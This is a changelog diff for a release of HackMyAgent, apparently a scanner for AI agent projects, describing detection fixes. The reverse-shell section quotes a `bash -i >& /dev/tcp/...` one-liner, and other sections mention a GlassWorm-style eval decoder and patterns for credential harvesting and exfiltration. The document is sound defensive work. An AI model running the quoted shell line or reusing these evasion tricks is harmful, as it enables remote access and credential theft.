@@ -4,6 +4,419 @@ All notable changes to HackMyAgent are documented in this file.
 
 ## [Unreleased]
 
+## [0.33.0] - 2026-09-13
+
+Everything below this heading down to the 0.32.0 entry landed on main after
+0.32.0 and ships here. Corpus goldens for `skill/malicious/exfil-skill` and
+`repo/malicious/kitchen-sink` were re-baked for this release (see
+`docs/testing/release-smoke.md` for the causes).
+
+### Known issues
+
+- `secure` reports `DEP-001` "No lock file found" (MEDIUM) on a tree that has
+  no package manifest at all, so an empty directory or a non-Node agent scores
+  93 where 0.32.0 scored 98. The finding existed in 0.32.0 and was hidden by
+  the file-less filter; #636 gave it a `file`. Tracked to read not-applicable
+  without a `package.json` in the next release.
+- `secure --ci -b oasb-1` reports `5.1: No Hardcoded Credentials` as passed on
+  a tree whose `.claude/settings.json` holds a plaintext key, while `secure`
+  and `detect` on the same tree flag it. Present in 0.32.0. Target 0.34.0
+  ([#739](https://github.com/opena2a-org/hackmyagent/issues/739)).
+- `check <local dir> --offline` prints a score (`96/100`, `Usable with caveats`)
+  and exits 0 while noting that the static checks were not run, so a local
+  directory holding a plaintext key gets a passing verdict. Present in 0.32.0.
+  Target 0.34.0 ([#740](https://github.com/opena2a-org/hackmyagent/issues/740)).
+- `-v` on `secure`, `scan-soul` and `check` prints the version and exits 0
+  without scanning, while each subcommand's `--help` documents `-v, --verbose`.
+  Present in 0.32.0. Target 0.34.0
+  ([#741](https://github.com/opena2a-org/hackmyagent/issues/741)).
+
+### `detect` lists the agent projects under a workspace root
+
+`hackmyagent detect` read the target directory alone. From a folder holding
+five agent repos it reported zero project agents, while the same command inside
+any one of them reported a shell MCP server, a key in `.cursorrules`, or a
+governance document that subverts its own control. The command's description
+("find unmanaged AI agents and MCP servers") is per machine, not per repo.
+
+`detect` now walks the target (default four levels, `--depth <levels>`,
+`--depth 0` for the old behaviour), treats a directory holding any AI config,
+project MCP file, governance file or capability policy as an agent project, and
+runs the existing per-directory scan on each. The report opens with
+"Shadow AI agents (N)": one line per project, worst first, with what identified
+it, its MCP server count and worst risk, governance score, whether a config
+carries a credential, and the verdict. Each project's critical and high findings
+follow with their `file:line`, `Fix` and `Verify`, one blank line between
+findings; the machine-wide inventory prints once. A credential citation names
+the key as written, the value's vendor prefix when it has one, and the length
+(`"ANTHROPIC_API_KEY" = sk-ant-api0… (108 chars)`) where 0.32.0 printed
+`matched "API_KEY"`, which read as a false positive. The exit code is the
+worst project's. `--json` adds
+`projects: [...]`, each entry the single-directory result for that project;
+`--export-csv` writes one file with `Scan Directory` set per project, and a
+`Governance File` row for each project that has one, so a directory identified
+only by its `SOUL.md` still appears in the inventory.
+
+A target that is itself an agent project renders exactly as before: a repo's
+governance fixtures and docs copies are not its shadow agents. The projects
+below it are named under Next Steps and in the JSON's additive `nestedProjects`
+key, and `--workspace` lists them all with the target included as `.`. A target
+that holds no agent project also renders as before. `node_modules`, build output
+and hidden directories are not entered, symbolic links are not followed, and the
+walk stops at 20,000 directories.
+
+There is no workspace-level governance score. Governance is a measurement of one
+document; a minimum over five of them would be a third number that means nothing.
+
+Citations now use the path relative to the current directory when the project
+sits below it (`hackmyagent secure deploy-runbook-agent`), the absolute path
+otherwise.
+
+### `detect` lists agents from installed evidence, not only running processes
+
+The agent list came from `ps` alone, so the "AI agents without governance"
+finding vanished the moment the developer closed the tool, and a project whose
+`.cursorrules` was present on a machine without Cursor listed no Cursor at all.
+Each agent now carries `state` (`running` or `installed`) and `source`
+(`process`, or the config that evidences it): a project AI config
+(`.cursorrules` is Cursor, `CLAUDE.md` and `.claude/settings.json` are Claude
+Code, ...) or a machine-wide tool config (`~/.cursor/mcp.json`,
+`~/.claude.json`, Claude Desktop's config, ...). A running entry outranks an
+installed one for the same tool. The governance finding fires for installed
+agents too and names the evidence; the "Running AI Agents" section is now
+"AI Agents" with a running/installed column; CSV agent rows carry
+`Installed: <config>` as their source. `pid` is present only for a running
+agent.
+
+### `detect` reports a JSON-quoted credential key
+
+`"ANTHROPIC_API_KEY": "sk-ant-..."` in `.claude/settings.json` was not a
+credential finding: the closing quote sits between the key name and the colon,
+and the pattern allowed no quote there. `secure` reported the same line. The
+pattern now accepts an optional closing quote before the separator.
+
+### `detect` reads Claude Desktop's config and `~/.claude.json`
+
+Machine-wide MCP discovery adds `~/Library/Application Support/Claude/claude_desktop_config.json`
+(macOS), `~/.config/Claude/claude_desktop_config.json` (Linux),
+`%APPDATA%\Claude\claude_desktop_config.json` (Windows) and the `mcpServers`
+block of `~/.claude.json`. On a laptop with 20 servers in each of the two
+Claude configs `detect` reported 0 machine-wide servers.
+
+### `--json --export-csv` stays parseable
+
+The "Asset inventory: <file>" notice was written to stdout after the JSON
+document, so the combination produced output no parser accepts. On the JSON
+channel the notice goes to stderr.
+
+### `secure` reports a credential value inside a skill body (SKILL-025)
+
+Five vendor-shaped tokens placed in `.claude/skills/<name>/SKILL.md` were each
+reported benign with no credential finding, while the same shapes in `.mcp.json`
+were CRITICAL. `SKILL-005` looks for credential file references (`~/.aws`,
+`.env`); no skill check read the body for a credential itself. `SKILL-025` runs
+the shared credential-format registry over each skill body and reports a
+CRITICAL finding with the file and line. The value is never repeated in the
+report.
+
+### `check <npm-name> --no-scan` no longer scans when the Registry query fails
+
+`--no-scan` asks for the Registry's answer and nothing else. On the npm path a
+query that produced no answer (a timeout, a 5xx, a network error) was returned
+as `null`, read as "not found", and control fell through to a download-and-scan
+the user had switched off; in `--json` mode nothing said so, and the result was
+a valid scan document with exit 0 in place of the registry record. The parity
+gate measured exactly that on an unchanged base (opena2a-parity, fixture
+`check-registered-ai`: four registry keys absent, exit 0, and a retry keyed on a
+non-zero exit that could not see it).
+
+Now the Registry's answer is three cases. A record is emitted as before. A
+query that did not complete exits 2 with a body that names the error
+(`source: registry`, `found: false`, `errorClass: registry-unreachable`, the
+message and status code) and says so on stderr in every mode; no scan runs. A
+genuine not-found keeps its prior behaviour on the npm path (the "not found on
+npm" block for a name npm does not carry), which the parity fixture
+`check-not-found` pins. The Registry timeout on the check path is 15 s, the
+same number ai-trust gives the same client for the same question, and
+`REGISTRY_URL` is honored on this path as on the other commands.
+
+### The NEMO-009 TS/JS gate carries template-literal state across the line boundary
+
+A token standing alone on its own line inside a multi-line template literal
+was read as code by the NEMO-009 TS/JS gate. The gate asked its per-line
+string-literal predicate about one line at a time, and the predicate lexes
+each line from column 0 in code state — so `eval(code);` sitting on a
+continuation line of a backtick literal (a skill document or prompt held in a
+template, say) fired `Unsafe deserialization: eval()` at CRITICAL even though
+the token is text inside the string.
+
+The gate now carries ONE lexical state across the line boundary: each line is
+first passed through a template-literal blanker that threads the state through
+the file's line loop — the same carried-state shape the AST sink walker
+already uses for block comments — and all four TS/JS match sites (bare eval,
+indirect eval, `new Function`, `JSON5.parse`) match against the blanked line.
+
+Suppression is scoped to the literal's own span, never to the file. A real
+`eval(` outside the literal in the same file still reports at its own line;
+the closing backtick returns the walk to code state, so the very next line is
+read as code again; and `${...}` interpolation inside the literal is a
+re-entry into code state, so an eval( in the interpolation keeps firing. The
+interpolation walk lexes its own strings, comments and regex literals under
+the same rules as the rest of the line, so a `}` sitting inside a quoted
+string, a comment or a regex within `${...}` never closes the interpolation
+early and never blanks the live code after it as template text. The
+walk is comment-aware across lines too, so a stray backtick in a doc comment
+(a markdown code fence, say) cannot open a phantom template that swallows the
+real code after it. The per-line predicate keeps its signature and its
+answers; every state the walk cannot settle at end of line drops the carry
+and over-reports rather than under-reports.
+
+### The CRED-HARVEST prose rule is clause-scoped, not two whole-file regexes ANDed
+
+The rule behind the `Credential harvesting` risk surface — and therefore behind
+every prose-derived AST-CRED-001 — was a credential noun matched ANYWHERE in a
+document ANDed with a request verb matched ANYWHERE in the same document.
+Neither operand knew where the other had matched, so two ordinary sentences
+hundreds of lines apart, about unrelated things, were enough to earn a CRITICAL.
+The measured witness: a skill document whose only credential noun was `token`
+inside "per-token attribution graphs", and whose only verb witnesses were
+`provide` inside "provider" and `request` inside "requested". No directive
+anywhere in the file, one CRITICAL.
+
+The evidence was as coarse as the gate. It was the FIRST credential noun in the
+file — a bare dictionary word, which `resolveFindingLine` correctly refuses to
+turn into a citation — so every row the rule produced was a CRITICAL carrying no
+line and no `Verify:`.
+
+The signal is now the CLAUSE. A credential noun and a request verb must occur in
+one clause, with the verb GOVERNING the noun (its object phrase, the passive
+subject that is the same relation inverted, or a same-clause anaphor) and no
+negator ahead of the verb in that clause. The clause window breaks at sentence
+ends and line ends, and deliberately not at colons or commas, so a split
+directive — "Provide the following: username, password, and API keys." — does
+not under-fire. The clause span is also the evidence, which is what gives every
+resulting AST-CRED-001 row a line for the first time.
+
+Verb matching is now whole-word over an enumerated set of inflections, so
+`provider` is no longer read as `provide` while "should be included" and "when
+requested" still match. The verb vocabulary gains `include|send|paste|reveal|
+disclose|return` alongside the original `ask|request|share|provide`, which is
+safe precisely because the window closed. The credential-noun class gains one
+spelling: `api[_-]?key` also admits a space, so the English "API key" that
+directives actually use is recognised rather than missed.
+
+Two shapes are knowingly given up: a harvesting directive whose verb sits behind
+a negator in its own clause, and one split across a line break. Both were
+unlocatable findings before — they had no line to lose — and both are pinned as
+tests rather than left to be rediscovered.
+
+A third shape is given up by measurement, not by design, and is recorded here
+so it is not paid silently. The corpus fixture `skill/malicious/exfil-skill` no
+longer produces AST-CRED-001. At the previous rule its row was `Credential
+risk: SECRET` with no line, licensed by the frontmatter key
+`AWS_SECRET_ACCESS_KEY` and the heading `## If asked about scope`, which sit in
+different clauses. No clause in that file holds a credential noun governed by a
+request verb; the remaining nouns (`GITHUB_TOKEN`) are frontmatter keys too. The
+fixture's other findings are unchanged and its score moves from 29 to 34. The
+golden for that fixture is re-baked in this change. The corpus manifest's
+expectation for the fixture (the `AST-CRED-001` row, whose rationale describes a
+value detection the rule never performed, and the `27-33` score band) needs a
+matching change in `opena2a-corpus`; until it lands, the corpus smoke reports
+the band mismatch on that fixture alone.
+
+AST-CRED-003's precondition no longer relies on the prose rule having fired.
+When the compiler produced no credential span or surface, the check now reads
+the bytes that follow each credential noun (the clause rule's own noun class,
+over the same 100-character reach the old evidence span had) with the shared
+credential-format matcher (vendor prefixes and the entropy-floored 40+
+character run, the predicate its doc-context gate already requires), so a real
+secret in doc-context markdown is still detected when no harvesting clause is
+present. A value whose bytes carry a fixture marker is skipped in every context,
+as the canonical scan skips its placeholders. The value route keeps every later
+gate, masks the value in the finding's summary, and derives the line from the
+matched value's offset. Its reach is the noun's, not the file's: over the
+release corpus the unbounded matcher also accepted `sha256:` digests and a
+FAKE-marked vendor value, which no route reported before and which this one
+does not report either.
+
+The canonical credential-format scan (`Hardcoded <label>` surfaces, confidence
+0.9, carrying their own offset) is untouched: it is a value-shaped route, not a
+prose one, and it is what detects real hardcoded secrets.
+
+### `mcp-serve` no longer posts its command telemetry event, and the MCP server's confinement is pinned by witness suites
+
+`mcp-serve` reads inside the granted roots and reaches nothing by default, so
+its command event was the session's one default network attempt, posted from a
+process a host model drives, and posted at startup rather than at the end of
+the session. The command now joins the untracked set alongside `telemetry` and
+`help`; nothing else about telemetry changes.
+
+Two suites now witness the confinement over a real stdio session against the
+built server: `__tests__/mcp/stdio-confinement-witness.test.ts` (absolute,
+`../` and symlink-out paths refused by every tool, `--root /` and `--root
+<HOME>` refused at initialisation, the set of paths a session creates equal to
+a committed allowlist) and `__tests__/mcp/stdio-egress-witness.test.ts` (an
+in-process logging proxy sees zero lines from a scan and a deep scan, and
+exactly one from the direct-request control).
+### "Hardcoded Secret Detected" now requires a secret-shaped value in the raw artifact bytes
+
+AST-CRED-003 fired on prose that merely NAMES credential types. The
+CRED-HARVEST surfaces it consumes are produced for any non-source artifact
+whose text contains a credential noun and any `ask|request|share|provide`
+substring — no word boundary, no proximity — and the emit gate required an
+actual credential-format value only in doc/test contexts, reading the
+evidence SPANS (a 100-char window anchored at the first credential noun)
+rather than the file. Three failure modes at once: a gitleaks config was
+reported as a hardcoded secret at line 2 (`secret`) because line 156 says
+`task's`; a JSON schema's long `$comment` did the same; and a documentation
+file whose real secret sat outside the noun-anchored span was suppressed
+entirely — the gate judged the span text, not the artifact.
+
+The gate in `checkHardcodedSecrets` now reads the RAW `artifactContent` for
+every artifact context: no AST-CRED-003 is emitted unless a canonical
+credential format (`hasCredentialFormat`) matches the raw bytes, and the
+finding's line and evidence come from the located value — masked, never the
+value itself — instead of the span start. When the caller supplies no
+content, doc/test contexts keep the evidence-text check as the fallback.
+Harvesting INTENT is unchanged and stays reportable: the capability
+analyzer's AST-CRED-001 "Credential Harvesting Pattern" still fires on the
+same prose, and AST-CRED-002 still fires on forwarding lines. The producer
+(`mapRiskSurfaces`, `extractEvidenceSpans`, the canonical value scan) is
+untouched, and HMA-27's value-shaped route for config artifacts keeps its
+exact finding set.
+### The PEM private-key redaction rule fails closed at any block size
+
+`redactSecretsForReport` carried a `pem-private-key` rule with an unbounded lazy body, so a report containing many armor headers with no footer took 10 s and more at the 1 MiB size gate. The body now stops at the next armor header instead of scanning to end of input, which brings the same input to a few milliseconds without bounding the block size: a complete block of any size is replaced whole (an RSA-32768 block exceeds 32 KiB once indented, the larger FrodoKEM PKCS#8 bodies exceed it by computed size alone, and indentation is unbounded), and a block whose footer is missing is replaced together with the key material that follows its header, while a header mentioned in prose is left as written unless key-shaped text follows it. New tests mint the keys they probe at test time and use a same-size synthetic stand-in for the RSA-32768 shape; none is committed.
+
+### `--json` is not deprecated, and the help strings stop saying it is
+
+From 0.8.0 through 0.32.0, `secure --help` described `--json` as deprecated
+(and `attack --help` called it a deprecated alias) while the README cited the
+flag throughout as the ordinary machine-output spelling. `--json` is not
+deprecated: it is shorthand for `--format json`, kept indefinitely. The
+`secure` and `attack` help strings, the #605 contradiction refusal and the
+source comments now say so. No flag is removed and no behaviour changes —
+same flags, same output, same exit codes.
+
+### A reverse shell in a skill's bundled scripts is now described by the bundle check
+
+`describeSkillBundlePayload` — the predicate behind the SKILL-006 finding over
+the files beside SKILL.md — recognised two shapes, both conjunctive: a curl/wget
+that reads a credential file into a remote request body, and a credential path
+with an exfiltration sink in the same statement. A reverse shell is neither.
+`bash -i >& /dev/tcp/10.0.0.1/4444 0>&1` in `scripts/recover.sh` names no
+credential and posts to no sink, so the one payload the skill actually ships ran
+past the check whose whole subject is the bundle — while the byte-identical line
+inside SKILL.md was reported CRITICAL.
+
+The predicate gains a third branch, and it reuses `SKILL_REVERSE_SHELL_PATTERNS`
+— the same six patterns the skill Markdown path already treats as sufficient on
+their own — rather than restating them, so the two paths cannot drift apart
+pattern by pattern. The list is exported for exactly that reason: the regression
+suite generates one case per element of the list, so a seventh pattern shipped
+with no bundled-script coverage fails the suite rather than passing it.
+
+Comments are unaffected. The `#`/`//` skip at the top of the predicate covers the
+new branch, so a `# bash -i >& /dev/tcp/...` line in a recovery runbook — and the
+shebang, skipped for the same reason it is not code — stays quiet.
+
+The bundle finding's description, message, fix and guidance now say "or opens a
+reverse shell" instead of naming exfiltration alone, and its per-file citation
+reads `opens a reverse shell via /dev/tcp/`. No check was added, no severity
+changed, and the skill Markdown path is untouched: a reverse shell in SKILL.md
+is still SKILL-008.
+
+### `explain` refuses unknown check IDs, and the inventory stops lying by omission (HMA-29)
+
+`explain NEMO-999` used to print the generic "Static analysis pattern
+finding." stub and exit 0 — every hyphenated unknown whose prefix had a
+category label got a confident non-answer with a green exit code. An ID
+outside the check inventory (the static explanations, the scan-soul
+governance catalog, and the taxonomy) now refuses on stderr, names the
+rejected ID, suggests the nearest known IDs (shared-prefix, then
+edit-distance neighbours), and exits 1. Every ID the CLI already explained
+still explains with exit 0.
+
+The inventory itself grew to match what `secure` actually emits: 24
+NanoMind semantic (AST) checks, 6 SOUL narrative checks, and the 8 SEM-MCP
+structural checks were reported in scan output but absent from
+`check-metadata` — `totalChecks` is now 362 (317 static · 45 semantic, 88
+categories). The deliberate holes the census measures are published in
+`check-metadata --json` under a new `exclusions` key naming the family,
+its IDs (or id pattern), and the reason: fix-application statuses,
+scan-status indicators, the Layer-3 coverage statement, the eval oracle's
+in-src test fixtures, the scan-soul governance control catalogue (still
+answered by `explain` via CONTROL_DEFS), per-run id families (ARP-*
+runtime-protection patterns, SEM-LLM-* narrative indices, red-team payload
+counters), and the inactive NanoMind daemon narrative families. A census
+test reads every emission shape in src/ — `checkId:` string literals,
+`PREFIX-${…}` templates, and a registered list of expression-valued sites
+(`ctrl.id`, `check.id`, `finding.id`, `r.payload.id`) — and fails when any
+emitted id is neither an inventory key nor declared-excluded, so the gap
+cannot regrow silently.
+
+`check-metadata --json` also gained a `severityNote`: severities are
+inventory defaults, semantic (AST/SEM) findings carry per-finding severity,
+and the fixed-severity sites (AST-MANIP-001, AST-HEARTBEAT-001,
+AST-INJECT-001 critical; AST-GOV-004, AST-PERSIST-001 high;
+SOUL-UNVERIFIABLE-CLAIM medium) are pinned so the table matches what
+`secure` emits. `explain` trims its argument before matching, refuses an
+empty ID with its own message, and its help example names IDs the command
+actually answers.
+
+### `.hmaignore` gains `<path>:<CHECK-ID>`, trailing comments, `expires:`, and loud exit-neutral errors
+
+A path rule used to be all-or-nothing: `danger.py` removed every check on that
+path from the score and the exit code. The new `danger.py:NEMO-009 # <reason>`
+form removes exactly one, with the same scope semantics as the path rule it
+narrows (the finding moves to `outOfScope`, channel `hmaignore-path-check`,
+and leaves the exit code), and the reason is required. Any rule may carry
+`expires:<YYYY-MM-DD>` at the end of the line; the rule is active through the
+named day (UTC) and lapses to a loud, inert error afterwards, its findings
+returning to the report.
+
+The parser is now one two-step parser shared by `secure` and `check` (the
+private duplicate in the NanoMind path is deleted), and the matcher is the one
+`secure` already shipped: check IDs match case-insensitively, `*` anywhere in a
+pattern; `check` gains that parity. Every line the parser refuses renders a
+`.hmaignore:<line>` error by default on both commands and rides
+`hmaignore.errors[]` in `--json`; an unreadable `.hmaignore` is the line-0
+entry with its errno. Errors never change the exit code.
+
+`secure --json` and `check --json` gain a top-level `hmaignore` key,
+present exactly when the file exists at the target, carrying every rule with
+its channel, reason, expiry and per-rule match count, plus the errors. It is
+CLI-local: no publish payload, contribution event, or settled record carries
+it. A document from a tree without a `.hmaignore` carries no `hmaignore` key.
+
+Why this is a minor rather than a patch: `--json` gains a top-level key, the
+documented `suppressedBy` field gains the `hmaignore-path-check` value, and
+the file grammar now honors trailing comments and refuses path globs.
+
+Three behaviour changes on existing `.hmaignore` files:
+
+- `danger.py # reason` was silently inert (the whole line, comment included,
+  was read as a path that matched nothing). The comment is now stripped and
+  the rule is an active scope rule: the path's findings leave the score and
+  the exit code, disclosed on the `Scope` line; a CI exit can move 1 -> 0 on
+  upgrade, toward the committed line's stated intent.
+- `!NEMO-009 # reason` was silently inert for the same reason. It is now an
+  active presentational rule: the finding leaves the list, never the verdict
+  or the exit code.
+- `*.py` (any glob in a path rule) was a silent no-op. It is now a loud,
+  exit-neutral `.hmaignore:<line>` error; the line is still not applied.
+
+### The stub loop has a terminus again: `pull-stubs` drops its vocabulary, `mark-stub` writes back
+
+### Fixed
+
+- The semantic compiler (the `./nanomind-core` library entry) threw an uncaught `RangeError` on
+  multi-megabyte same-alphabet runs: every credential pattern battery reachable from `compile()` is
+  now bounded at 1 MiB (the same cap the CLI applies before compiling). An artifact over the cap is
+  reported as a named refusal — a warning plus a high-severity refusal finding — for every artifact
+  type, never as a clean result, and a raised `maxArtifactSize` cannot re-arm the throw. No
+  credential pattern was narrowed; artifacts under the cap produce byte-identical results.
+
 ### The stub loop has a terminus again: `pull-stubs` drops its vocabulary, `mark-stub` writes back (HMA-08)
 
 Two defects at the same place — the point where a confirmed ARIA observation is
@@ -55,7 +468,7 @@ two land independently. `docs/release-playbook.md` gains the two release steps:
 a `--dry-run` preview for every stub a release claims, before the tag is
 pushed, and the real send afterwards from the published artifact.
 
-### The static suite reaches where skills actually live (HMA-07)
+### The static suite reaches where skills actually live
 
 `.claude/skills/<name>/SKILL.md` is where skills sit on disk, and the scanner
 never opened one. `findSkillFiles` skipped every dot-directory except
@@ -88,9 +501,10 @@ the default scan reporting the same false clean.
 
 **The detection vocabulary does not move.** No check was added, no severity
 changed, and no pattern was widened — this changes only which files the existing
-checks are given. The bundle finding fires on a conjunction (a credential file
-read into a remote request body, or a credential path and an exfiltration sink
-in the same statement), so an ordinary bundled installer stays quiet: every
+checks are given. As of this change the bundle finding fired on a conjunction
+only (a credential file read into a remote request body, or a credential path
+and an exfiltration sink in the same statement) — the reverse-shell branch is a
+later change, described above — so an ordinary bundled installer stays quiet: every
 committed fixture in the tree, and the repository's own self-scan, produce a
 byte-identical finding set before and after.
 
@@ -229,14 +643,60 @@ question with a lexical test for the third time in this check; it belongs with
 #424's AST dataflow work, and the regexes themselves are byte-identical to before
 this change so that claim can be diffed rather than taken on trust.
 
-**One narrowing, disclosed:** matching per line means `eval` and `(` separated by a
-newline no longer match. That spelling is legal JavaScript and is a real loss of one
-lexical variant, on a corroborator that already misses the eight spellings above.
+**The newline spelling corroborates.** Matching per line briefly meant `eval` and
+`(` separated by a newline did not match — a real loss of one legal-JavaScript
+lexical variant, disclosed at the time. The presence loop now carries the trailing
+sink token across the line boundary: a line whose last code token (outside strings
+and comments) is `eval`, `Function` or `new Function`, followed by the next line
+with code opening with `(`, is the same call the per-line patterns match. The two
+patterns themselves are still byte-identical; the newline case is state, not
+vocabulary.
 
 The uncorroborated finding's own description and guidance were reworded to match:
 they used to say no `eval(` or `Function(` call "appears in this file", which is now
 false about a file that mentions one in a comment. They say "in code" and name the
 line-length limit.
+
+### The sink corroborator's string predicate lexes regex literals, so a same-line regex no longer downgrades a decoder (HMA-31)
+
+`isMatchInsideStringLiteral` tracked quote state character by character and its
+own doc comment said it did not attempt to detect regex literals. So the
+apostrophe in `const re = /['"]/; eval(buildPayload());` opened phantom quote
+state, the `eval` token answered "inside a string", and a live GlassWorm decoder
+reported MEDIUM instead of CRITICAL. MEDIUM exits 0: one zero-cost line beside
+the sink walked the finding past a CI gate.
+
+The predicate now lexes regex literals. A `/` opens a regex after one of the
+opener punctuators `(` `,` `=` `:` `[` `!` `&` `|` `?` `;` `{`, after a
+regex-position keyword, or at line start; it is division after an identifier, a
+number, a string literal, or `]`; after `)` the same-line matching `(` decides
+(`if`/`while`/`for`/`with`). A word after `.` is a property name, never a
+keyword — `stats.in / stats.out` and `obj.if(y) / 2` are divisions — and a word
+is any run of identifier characters, ASCII or not, so `π / 2` is a division
+too. When the previous token is `}`, a `)` whose `(` is not on the line, or a
+punctuator outside the opener set (`+` `-` `*` `<` `>` …), the slash is
+undecidable: the rest of the line is lexed both ways and only agreement
+suppresses, and past six such points on one line the helper stops branching and
+fails toward corroboration. The both-ways walk runs once per line and is
+cached, so a crafted line full of undecidable slashes and string mentions of
+`eval` costs one walk, not one per mention. Inside a regex, escapes and `[...]`
+classes are honoured. Comment blanking is regex-aware under the same rules: the
+`//` in `/^https?:\/\//` and the `/*` in `/\/*$/` are regex text, not comment
+openers that used to blank the rest of the line or file past them. The
+suppression cases all hold: `{ pattern: /eval\s*\(/, label: 'eval() dynamic
+execution' }` still reads the label as a string, and `scanner.ts` scanned on its
+own text is still a MEDIUM lead, not a CRITICAL.
+
+One narrowing, disclosed: a sink token written inside a regex literal's body —
+`/\beval(x)/.test(s)` — is now read as a mention rather than a call and no
+longer corroborates on its own. That is the suppression direction of the same
+rule that stops a regex from hiding a real sink beside it.
+
+A sink on a line over the per-line length bound is still not read — removing the
+bound would reopen the minified-bundle false positive it was introduced for —
+but the uncorroborated finding now names the skipped line and says it was not
+read because it exceeds the per-line limit, instead of implying it was read and
+found clean.
 
 ### secure no longer follows a link out of the directory it scans
 
@@ -327,7 +787,7 @@ their em dash (`fix-all --with-aim`, `opena2a protect .`,
 
 ### A contradiction between --json and --format is named, not resolved silently
 
-`--json` is the deprecated alias of `--format json`. Given together with a
+`--json` is shorthand for `--format json`. Given together with a
 different format — `secure --ci --json --format sarif` — the alias won
 silently: the json report printed at exit 0 and nothing said the requested
 format was discarded. Both commands that carry the two flags (`secure` and
